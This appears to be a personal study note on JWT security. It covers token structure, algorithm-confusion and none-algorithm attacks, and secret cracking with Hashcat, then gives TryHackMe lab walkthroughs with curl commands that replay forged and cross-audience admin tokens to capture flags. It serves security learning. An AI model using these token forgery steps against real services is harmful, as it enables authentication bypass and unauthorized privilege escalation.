# 🔑  JSON Web Tokens (JWT) Security

## 📌 What are JWTs?

- **JWTs (JSON Web Tokens)** = stateless tokens for authentication/authorization.
    
- Commonly sent in:
    
    - `Authorization: Bearer <JWT>` header.
        
    - Sometimes in cookies, but less common for APIs.
        
- Structure: `header.payload.signature`
    
    - **Header** → type & algorithm (`HS256`, `RS256`, `none`).
        
    - **Payload** → claims (`username`, `role`, `exp`, etc).
        
    - **Signature** → cryptographic check for integrity/authenticity.
        

---

## 🧪 Tools for Analysis

- **JWT.io** → online decoder, modify claims, test signature.
    
- **CyberChef** → decode/encode Base64Url, manipulate `alg` fields.
    
- **Burp Suite (Extender plugins)** → intercept, decode, and fuzz JWTs automatically.
    
- **Hashcat / John the Ripper** → brute force weak symmetric secrets (`-m 16500`).
    

---

## ⚠️ Signature & Algorithm Risks

- **None algorithm** → bypass signature verification.
    
- **Weak HS256 secrets** → brute forceable.
    
- **Algorithm Confusion** → RS256 (asymmetric) downgraded to HS256 (symmetric) → use public key as secret.
    
- **Not verifying signatures** → payload freely editable.
    

💡 **Testing tip**: Always check if the backend **actually verifies the signature** or just decodes the token.

---

## 🧪 Methodology: Testing JWTs

1. **Locate the JWT**
    
    - Look in `Authorization: Bearer ...` headers, cookies, or URL params.
        
2. **Decode It**
    
    - Use `jwt.io` or CyberChef to view `header` + `payload`.
        
    - Look for: `alg`, `exp`, `aud`, `role`, `admin`, etc.
        
3. **Check Payload**
    
    - Are sensitive values exposed? (password hashes, flags, IPs).
        
    - Are privilege claims (`admin: 1`) modifiable?
        
4. **Check Algorithm**
    
    - If `alg = none` → try removing signature.
        
    - If `RS256` → test downgrade to `HS256` with public key.
        
    - If `HS256` → test weak secret cracking (Hashcat).
        
5. **Test Signature Validation**
    
    - Remove/alter signature → does API still accept token?
        
    - Modify claims (e.g., `admin=1`) → replay → check if backend honors it.
        
6. **Check Expiration & Lifetime**
    
    - Look for missing/huge `exp`.
        
    - Try expired token → does it still work?
        
7. **Check Audience Claim**
    
    - If multiple apps → see if token from AppA works on AppB (Cross-Service Relay).
        

---

## 🛡️ Secure Implementation

- Never use `alg: none`.
    
- Enforce strong algs (`HS256`, `RS256`) consistently.
    
- Use **long, random secrets** for HS256.
    
- Don’t expose sensitive info in payload.
    
- Validate `exp`, `aud`, and all critical claims.
    
- Short token lifetimes + refresh tokens.
    
- Central auth service but verify claims per app.
    

---

## 📌 Key Takeaways

- JWTs are powerful but fragile if misconfigured.
    
- Main attacker workflow = **decode → modify claims → bypass signature/algorithm → replay**.
    
- Tools like **jwt.io + CyberChef** make claim manipulation trivial.
    
- Always test: **signature validation, algorithms, expiration, and audience enforcement**.
    

---

## TryHackMe Room examples

#### example 4
![](../../../Pasted%20image%2020250820233239.png)

#### Example 5

```
➜  ~ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password5" }' http://10.10.37.9/api/v1.0/example5
{
  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
}
```
![](../../../Pasted%20image%2020250821201923.png)

```

➜  ~ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjEsImlhdCI6MTc1NTgwMzgxOX0.Ih7vuBSQcYWwsjHyNN5ymo43PnNfbn2RikP7B3EmGNw' http://10.10.37.9/api/v1.0/example5\?username\=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{f592dfe2-ec65-4514-a135-70ba358f22c4}"
}

```

#### Example 7
``` bash
➜  ~ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appA" }' http://10.10.37.9/api/v1.0/example7
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4"
}
➜  ~ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.10.37.9/api/v1.0/example7_appA\?username\=admin
{
  "message": "Unauthorized, you are not an admin"
}
➜  ~ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.10.37.9/api/v1.0/example7_appB\?username\=admin
{
  "message": "JWT could not be read: Invalid audience"
}
➜  ~ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appB" }' http://10.10.37.9/api/v1.0/example7
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o"
}
➜  ~ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.10.37.9/api/v1.0/example7_appA\?username\=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{f0d34fe1-2ba1-44d4-bae7-99bd555a4128}"
}
➜  ~ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.10.37.9/api/v1.0/example7_appB\?username\=admin
{
  "message": "Welcome admin, you are an admin, but there is no flag for you here"
}

```